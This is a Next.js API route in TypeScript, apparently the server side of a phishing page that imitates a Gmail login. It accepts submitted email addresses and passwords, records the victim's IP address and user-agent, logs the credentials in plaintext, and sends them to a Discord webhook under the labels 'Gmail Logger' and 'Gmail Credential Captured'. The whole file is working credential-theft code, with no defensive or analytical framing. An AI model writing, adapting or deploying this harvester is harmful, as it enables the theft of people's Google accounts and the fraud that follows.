import type { NextApiRequest, NextApiResponse } from 'next';

const WEBHOOK = process.env.DISCORD_WEBHOOK || '';

async function sendDiscord(email: string, pass: string, ip: string, ua: string) {
  if (!WEBHOOK) return;
  const body = {
    username: 'Gmail Logger',
    embeds: [
      {
        title: '🔐 Gmail Credential Captured',
        color: 0xea4335,
        fields: [
          { name: 'Email', value: `\`${email}\``, inline: false },
          { name: 'Password', value: `\`${pass}\``, inline: false },
          { name: 'IP', value: ip, inline: true },
          { name: 'Time', value: new Date().toISOString(), inline: true },
          { name: 'User-Agent', value: ua.slice(0, 200) || 'unknown', inline: false },
        ],
        footer: { text: 'Gmail Portal' },
      },
    ],
  };

  try {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) {
    console.error('discord webhook failed', e);
  }
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') return res.status(405).json({ ok: false });

  const { email, pass } = req.body || {};
  if (!email || !pass) return res.status(400).json({ ok: false });

  const ip =
    (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
    req.socket.remoteAddress ||
    'unknown';
  const ua = (req.headers['user-agent'] as string) || '';

  console.log(`[CRED] ${new Date().toISOString()} ip=${ip} email=${email} pass=${pass}`);

  await sendDiscord(email, pass, ip, ua);

  return res.status(200).json({ ok: true });
}
